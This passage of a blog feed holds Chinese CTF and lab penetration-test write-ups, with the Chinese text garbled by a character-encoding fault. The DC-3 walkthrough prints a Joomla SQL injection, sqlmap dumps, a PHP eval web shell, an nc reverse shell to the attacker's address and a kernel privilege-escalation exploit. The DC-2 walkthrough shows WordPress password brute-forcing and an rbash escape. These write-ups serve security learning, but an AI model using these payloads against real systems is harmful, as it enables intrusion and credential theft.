id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h1><h2 id="BUU-LFI-COURSE-1"><a href="#BUU-LFI-COURSE-1" class="headerlink" title="BUU LFI COURSE 1"></a>BUU LFI COURSE 1</h2><p>å¾…ç»­â€¦</p><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>å¾…ç»­â€¦</p><h1 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h1><h2 id="GKCTF2020-EZä¸‰å‰‘å®¢-EzNode"><a href="#GKCTF2020-EZä¸‰å‰‘å®¢-EzNode" class="headerlink" title="[GKCTF2020]EZä¸‰å‰‘å®¢-EzNode"></a>[GKCTF2020]EZä¸‰å‰‘å®¢-EzNode</h2><p>å¾…ç»­â€¦</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-3é¶æœºæ¸—é€æµ‹è¯•æŠ¥å‘Š</title>
      <link href="2021/03/15/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/"/>
      <url>2021/03/15/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>è“è‹Ÿçš„é»‘ç›’æµ‹è¯•ä¹‹æ—…â€”â€”DC3<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3785124930.png"></p><h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><p>äºŒè¯ä¸è¯´ï¼Œå…ˆæ‰«æ³¢å†…ç½‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3389956070.png"></p><p>æ¥ç€nmapæ‰«ä¸€ä¸‹å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†80ç«¯å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -A 192.168.232.145</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/547341395.png"></p><p>äºæ˜¯æˆ‘ä»¬æ‰“å¼€å…¶ç½‘é¡µçœ‹è§å…¶cmsæ˜¯joomlaï¼Œå¹¶æç¤ºæˆ‘ä»¬åªæœ‰ä¸€ä¸ªflagä¸”éœ€è·å–rootæƒé™<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3098420025.png"></p><p>æ¥ç€æˆ‘ä»¬ç”¨dirbæ‰«ä¸‹ç›®å½•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;192.168.15.139&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1188796362.png"></p><p>æœ€åæˆ‘ä»¬åœ¨ <code>README.txt</code> ç›®å½•ä¸‹å‘ç°joomlaæ˜¯3.7çš„<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/929214917.png"></p><h2 id="æ¼æ´æ”»å‡»"><a href="#æ¼æ´æ”»å‡»" class="headerlink" title="æ¼æ´æ”»å‡»"></a>æ¼æ´æ”»å‡»</h2><p>é€šè¿‡ä»¥ä¸Šä¿¡æ¯ï¼Œæˆ‘ä»¬æœç´¢ä¸€ä¸‹joomla3.7æ¼æ´å‘ç°å­˜åœ¨sqlæ³¨å…¥<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2144505493.png"></p><p>æ¥ç€æˆ‘ä»¬å¼€å§‹æ„é€ url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml(0x23,concat(1,user()),1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/826557285.png"><br>å¯ä»¥çœ‹åˆ°ç¡®å®æ˜¯å­˜åœ¨æ¼æ´æ»´</p><p>sqlmapæŸ¥è¯¢ä¸€ä¸‹æ•°æ®åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.15.139&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml(0x23,concat(1,user()),1)&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2577563000.png"></p><p>å†æŸ¥ä¸€ä¸‹è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.15.139&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml(0x23,concat(1,user()),1)&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent â€“D joomladb --tables -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3151258998.png"></p><p>ç„¶åå†æŸ¥ä¸€ä¸‹åˆ—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.15.139&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml(0x23,concat(1,user()),1)&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent -D joomladb -T &#39;#__users&#39; --columns -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3767735883.png"></p><p>æœ€åæŸ¥è¯¢è´¦å·å¾—åˆ°ä¸€ä¸²hashåŠ å¯†çš„å¯†ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.15.139&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml(0x23,concat(1,user()),1)&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent -D joomladb -T &#39;#__users&#39; -C username,password --dump -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2551483727.png"></p><p>johnè§£å¯†å¾—åˆ°å¯†ç ä¸ºsnoopyï¼ˆä¸æ‡‚ä¸ºå•¥æˆ‘å¾—ä¸åˆ°&amp;cmd5ä¹ŸæŸ¥ä¸åˆ°.jpg<br>æ¥ç€æˆ‘ä»¬ç™¾åº¦joomla3.7çš„é»˜è®¤åå°å¾—çŸ¥ä¸º <code>administrator</code> ï¼›æˆåŠŸç™»è¿›åå°<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/754580446.png"></p><h2 id="Webæ¸—é€"><a href="#Webæ¸—é€" class="headerlink" title="Webæ¸—é€"></a>Webæ¸—é€</h2><p>åœ¨Templatesä¸­å‘ç°å¯ä»¥ä¿®æ”¹phpçš„æ–‡ä»¶ï¼Œäºæ˜¯ä¹æˆ‘ä»¬å†™ä¸ªphpçš„ä¸€å¥è¯æœ¨é©¬ä¸Šå»</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;harvey&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1907898004.png"></p><p>é€šè¿‡èšå‰‘è¿æ¥<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/582655106.png"></p><p>å†™ä¸ªåå¼¹shellä¸Šä¼ ï¼ˆèšå‰‘æ˜¯éæŒç»­è¿æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.15.140 2333 &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/990505965.png"></p><p>ç„¶åè®¿é—®æ­¤ç½‘ç«™å¼€å¯ç›‘å¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2712140000.png"></p><p>ç„¶åæˆ‘ä»¬ä½¿ç”¨searchsploitå·¥å…·æ¥æŸ¥æ‰¾Ubuntu 16.04çš„ææƒæ¼æ´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1096698954.png"></p><p>æŸ¥çœ‹è¯¥æ¼æ´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;39772.txt</span><br></pre></td></tr></table></figure><p>å¾—åˆ°expä¸‹è½½é“¾æ¥å¹¶ä¸‹è½½ï¼ŒåŒæ—¶ä¸Šä¼  <code>exploit.tar</code> å¹¶è§£å‹è¿è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">expä¸‹è½½åœ°å€</span><br><span class="line">Exploit-DB Mirror: https:&#x2F;&#x2F;github.com&#x2F;offensive-security&#x2F;exploitdb-bin-sploits&#x2F;raw&#x2F;master&#x2F;bin-sploits&#x2F;39772.zip</span><br><span class="line">è¿™é‡Œæˆ‘æ˜¯ç›´æ¥æœ¬åœ°ä¸‹è½½ç„¶åé€šè¿‡èšå‰‘ä¸Šä¼ </span><br><span class="line">unzip 39772.zip</span><br><span class="line">cd 39772</span><br><span class="line">unzip 39772.zip</span><br><span class="line">cd 39772</span><br><span class="line">ls</span><br><span class="line">tar xvf exploit.tar</span><br><span class="line">ls</span><br><span class="line">cd ebpf_mapfd_doubleput_exploit</span><br><span class="line">ls</span><br><span class="line">.&#x2F;compile.sh</span><br><span class="line">.&#x2F;doubleput</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4124551179.png"></p><p>ä¸çŸ¥é“è¿™é‡Œå’‹è§£å†³æƒ¹~è¹²ä¸ªå¤§ä½¬èµæ•™.jpg</p><p>åæ­£æœ€åè·å–rootæƒé™åï¼Œåœ¨rootç›®å½•ä¸‹è·å–åˆ°flag</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF 2021</title>
      <link href="2021/03/14/2021VNCTF/"/>
      <url>2021/03/14/2021VNCTF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å‘œå‘œå‘œ~wtcl</p></blockquote><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Check-In"><a href="#Check-In" class="headerlink" title="Check_In"></a>Check_In</h2><blockquote><p>Welcome to Vnctf2021<br>ç¾¤å·:717513199<br>æ³¨æ„:<br>æ¯”èµ›ç»“æŸåï¼Œè¯·æ€»æ¦œå‰åäº”ï¼Œåˆ†æ¦œå‰ä¸‰çš„å¸ˆå‚…ä»¬åœ¨2021 å¹´03æœˆ15æ—¥ä¸­åˆ12ç‚¹å‰æäº¤è¯¦ç»†çš„è§£é¢˜æ€è·¯åˆ°èµ›äº‹é‚®ç®±ï¼š<a href="mailto:&#x31;&#50;&#x38;&#x37;&#x30;&#49;&#49;&#54;&#48;&#x32;&#x40;&#113;&#x71;&#46;&#x63;&#x6f;&#109;">&#x31;&#50;&#x38;&#x37;&#x30;&#49;&#49;&#54;&#48;&#x32;&#x40;&#113;&#x71;&#46;&#x63;&#x6f;&#109;</a><br>è¯·æäº¤wpçš„å„ä½å¸ˆå‚…å¤‡æ³¨è‡ªå·±çš„å§“åå’Œå­¦æ ¡æ–¹ä¾¿æˆ‘ä»¬å‘æ”¾å¥–å“ã€‚<br>FLAG:vnctf{Have_a_good_time!}</p></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h2><blockquote><p>é€šå…³æ¸¸æˆå°±æœ‰flagå“¦å®è´ä»¬</p></blockquote><p>æ‰‹æ®‹å…šåˆæ¥ç©CTFæ¸¸æˆå•¦ï¼é‚£è‚¯å®šå…ˆæ¥æ”¹æ”¹ä»–çš„jsä»£ç ~<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/100289661.png"></p><p>å› ä¸ºé‚£ä¸ªå‚æ•°æ˜¯å¼€å±€çš„å‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è‡ªæ€ä¸€æ¬¡<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/437729839.png"></p><p>escé‡ç”Ÿåä½ å°±æ‹¥æœ‰äº†è¶…å¤šçš„å›(é¦™)æ—‹(è•‰)é•–(çš®)<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2399448244.png"></p><p>ç„¶åæˆ‘ä»¬é€šå…³å°±èƒ½è·å–flag:flag{this_game_is_funny!}ï¼ˆè¿™æˆ‘ç«Ÿç„¶ä¹Ÿä¼šæ­»äº†..</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2034255113.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VNCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-å‹ç¼©åŒ…é‚£äº›äº‹å„¿</title>
      <link href="2021/03/12/CTF-%E5%8E%8B%E7%BC%A9%E5%8C%85%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/"/>
      <url>2021/03/12/CTF-%E5%8E%8B%E7%BC%A9%E5%8C%85%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><h2 id="1-ARCHPR"><a href="#1-ARCHPR" class="headerlink" title="1.ARCHPR"></a>1.ARCHPR</h2><blockquote><p>ARCHPRåˆ†ä¸ºæš´åŠ›ã€æ©ç ã€å­—å…¸ä¸‰ä¸ªæ¨¡å—<br>1.æš´åŠ›:é€‰æ‹©å¯†ç èŒƒå›´,é•¿åº¦ç­‰,ç”±è½¯ä»¶ç»„åˆç”Ÿæˆå¯†ç è¿›è¡Œçˆ†ç ´<br>2.æ©ç :çŸ¥é“å¯†ç ä¸­çš„ä¸€éƒ¨åˆ†,åªéœ€æŒ‰è§„åˆ™æ„é€ å…¶ä½™éƒ¨åˆ†<br>3.å­—å…¸:é€šå¸¸æ˜¯å¤šæ•°ç”¨æˆ·å¸¸ç”¨çš„ä¸€äº›å¯†ç é›†åˆ,å¯¼å…¥å­—å…¸æ–‡ä»¶ç”¨å…¶ä¸­çš„å¯†ç è¿›è¡Œçˆ†ç ´</p></blockquote><p><a href="https://pan.baidu.com/s/1pO01qBdRR8HdN_AW1NoDGQ"><strong>ä¸‹è½½åœ°å€</strong></a><strong>ï¼ˆæå–ç ï¼š5bapï¼‰</strong></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1807440072.png" alt="img"></p><h2 id="2-Ziperello"><a href="#2-Ziperello" class="headerlink" title="2.Ziperello"></a>2.Ziperello</h2><blockquote><p>ä¸€èˆ¬æ¥è¯´ï¼Œè¿™å·¥å…·å¯¹8ä½åŠä»¥ä¸‹çš„æ•°å­—å¯†ç çš„zipå‹ç¼©åŒ…å¾ˆniceï¼ç§’ç ´ï¼</p></blockquote><p><a href="https://pan.baidu.com/s/1WUPFIUa-8lIeI8JBVcy0CQ"><strong>ä¸‹è½½åœ°å€</strong></a><strong>ï¼ˆæå–ç ï¼špa1zï¼‰</strong><br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3590603565.png" alt="img"></p><h2 id="3-PackageCrack"><a href="#3-PackageCrack" class="headerlink" title="3.PackageCrack"></a>3.PackageCrack</h2><p><a href="https://pan.baidu.com/s/1n-p2AgdHmxqLYpr8-reafA"><strong>ä¸‹è½½åœ°å€</strong></a><strong>ï¼ˆæå–ç ï¼š73r2ï¼‰</strong></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/68727731.png" alt="img"></p><h2 id="4-binwalk-foremost"><a href="#4-binwalk-foremost" class="headerlink" title="4.binwalk/foremost"></a>4.binwalk/foremost</h2><p>è¿™è²Œä¼¼æ²¡å•¥å¥½è¯´çš„äº†</p><blockquote><p>binwalk xxx<br>binwalk -e xxx</p><p>foremost xxx</p></blockquote><h2 id="5-ä¼ªåŠ å¯†-010-winhex"><a href="#5-ä¼ªåŠ å¯†-010-winhex" class="headerlink" title="5.ä¼ªåŠ å¯†-010/winhex"></a>5.ä¼ªåŠ å¯†-010/winhex</h2><blockquote><p>zipï¼š09â€”&gt;00<br>rarï¼šå¿˜äº†.jpg</p></blockquote><p>PSï¼šZipCenOpå»ä¼ªåŠ å¯†ï¼ˆä¿ºåæ­£æ˜¯æ²¡ç”¨è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">é¡¹ç›®åœ°å€</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;FantasqueX&#x2F;ZipCenOp</span><br><span class="line">è§£å¯†å‘½ä»¤</span><br><span class="line">java -jar ZipCenOp.jar r xxxx.zip</span><br><span class="line">åŠ å¯†å‘½ä»¤</span><br><span class="line">java -jar ZipCenOp.jar e xxxx.zip</span><br></pre></td></tr></table></figure><h2 id="6-crc32ç¢°æ’"><a href="#6-crc32ç¢°æ’" class="headerlink" title="6.crc32ç¢°æ’"></a>6.crc32ç¢°æ’</h2><blockquote><p>CRCæ ¡éªŒå®ç”¨ç¨‹åºåº“ åœ¨æ•°æ®å­˜å‚¨å’Œæ•°æ®é€šè®¯é¢†åŸŸï¼Œä¸ºäº†ä¿è¯æ•°æ®çš„æ­£ç¡®ï¼Œå°±ä¸å¾—ä¸é‡‡ç”¨æ£€é”™çš„æ‰‹æ®µã€‚åœ¨è¯¸å¤šæ£€é”™æ‰‹æ®µä¸­ï¼ŒCRCæ˜¯æœ€è‘—åçš„ä¸€ç§ã€‚CRCçš„å…¨ç§°æ˜¯å¾ªç¯å†—ä½™æ ¡éªŒã€‚<br>æ€»ä¹‹æ¯ä¸ªæ–‡ä»¶éƒ½æœ‰å”¯ä¸€çš„CRC32å€¼ï¼Œå³ä¾¿æ•°æ®ä¸­ä¸€ä¸ªbitå‘ç”Ÿå˜åŒ–ï¼Œä¹Ÿä¼šå¯¼è‡´CRC32å€¼ä¸åŒã€‚è‹¥æ˜¯çŸ¥é“ä¸€æ®µæ•°æ®çš„é•¿åº¦å’ŒCRC32å€¼ï¼Œä¾¿å¯ç©·ä¸¾æ•°æ®ï¼Œä¸å…¶CRC32å¯¹ç…§ï¼Œä»¥æ­¤è¾¾åˆ°æš´åŠ›çŒœè§£çš„ç›®çš„ã€‚ä½†é€šå¸¸åªé€‚ç”¨äºè¾ƒå°æ–‡æœ¬æ–‡ä»¶ã€‚</p></blockquote><p><a href="https://pan.baidu.com/s/13jfZT5QOBZa1lgmtzk9ywg"><strong>ä¸‹è½½åœ°å€</strong></a><strong>ï¼ˆæå–ç ï¼š1dwmï¼‰</strong></p><p>é£Ÿç”¨æ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python crc32.py reverse crc32</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4160273894.png" alt="img"><br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4038618222.png" alt="img"></p><p>å¾…ç»­â€¦</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšå†™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-2é¶æœºæ¸—é€æµ‹è¯•æŠ¥å‘Š</title>
      <link href="2021/03/09/DC-2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/"/>
      <url>2021/03/09/DC-2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="å¼€å¯å¾ç¨‹â€”â€”DC2"><a href="#å¼€å¯å¾ç¨‹â€”â€”DC2" class="headerlink" title="å¼€å¯å¾ç¨‹â€”â€”DC2"></a><strong>å¼€å¯å¾ç¨‹â€”â€”DC2</strong></h1><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1166668819.png"></p><p>è€æ ·å­ï¼Œå…ˆå†…ç½‘æ‰«æä¸€æ³¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2348014230.png"></p><p>æ¥ç€nmapæ‰«ä¸€ä¸‹ä»–çš„ç«¯å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p1-65535 -A -sV 192.168.232.142</span><br></pre></td></tr></table></figure><p>sshé»˜è®¤ç«¯å£ä¸æ˜¯22ï¼Ÿç«Ÿç»™æ”¹æˆäº†7744<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3263565253.png"></p><p>æ‰“å¼€ç½‘é¡µå‘ç°ä¼šæ‰“ä¸å¼€ï¼Œè¿™æ—¶å°±éœ€è¦è®¾ç½®hostsæ–‡ä»¶æ‰èƒ½è®¿é—®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;hosts</span><br><span class="line">#è¾“å…¥iè¿›è¡Œä¿®æ”¹</span><br><span class="line">192.168.232.142         dc-2</span><br><span class="line">#ä¿å­˜è¿”å› è¾“å…¥:x                                                                                                                                           </span><br><span class="line">cat &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1464127190.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1425742630.png"></p><p>æ­¤æ—¶è®¿é—® <code>http://dc-2</code> å³å¯ï¼Œæ‰“å¼€å‘ç°æ˜¯wpçš„<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1710624774.png"></p><p>å‘ç°flag1<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2085853415.png"></p><p>æ ¹æ®æç¤ºéœ€è¦cewlï¼Œç”Ÿæˆå¯†ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cewl -w passwords.txt http:&#x2F;&#x2F;dc-2</span><br><span class="line">cat passwords.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/524969615.png"></p><p>æ¥ç€æˆ‘ä»¬ä½¿ç”¨ä¸“é—¨æ‰«wpçš„wpscanæ‰«æç”¨æˆ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;dc-2 --enumerate u</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2931284701.png"></p><p>æœ€åæˆåŠŸå¾—åˆ°ä¸‰ä¸ªç”¨æˆ·åï¼šadminã€tomã€jerryï¼Œå¹¶åˆ›å»ºuser.txtå°†å…¶æ”¾å…¥<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1423596692.png"></p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®æ‰€å¾—userå’Œpasswordsçš„å­—å…¸ç”¨wpscanè¿›è¡Œçˆ†ç ´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --ignore-main-redirect --url 192.168.232.142 -U user.txt -P passwords.txt --force</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2652349826.png"></p><p>æœ€åæˆ‘ä»¬æˆåŠŸçˆ†ç ´å‡ºäº†è´¦å·å¯†ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[SUCCESS] - jerry &#x2F; adipiscing                        [SUCCESS] - tom &#x2F; parturient</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/507783810.png"></p><p>åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥sshè¿è¿›å»äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.232.142 -p 7744</span><br><span class="line">parturient</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/21278984.png"></p><p>è¿›å»åå‘ç°shellè¢«é™åˆ¶äº†ï¼Œäºæ˜¯æˆ‘ä»¬éœ€è¦ç»•è¿‡rbashï¼Œç„¶åè®¾ç½®ç¯å¢ƒå˜é‡ï¼Œæœ€ç»ˆæˆåŠŸcatåˆ°flag3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line"></span><br><span class="line">BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a</span><br><span class="line">&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">cat flag3.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3885569980.png"></p><p>æ ¹æ®æç¤ºæˆ‘ä»¬å†åˆ‡æ¢æˆç”¨æˆ·jerryçš„,åœ¨jerryç”¨æˆ·ä¸‹å¾—åˆ°flag4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br><span class="line">adipiscing</span><br><span 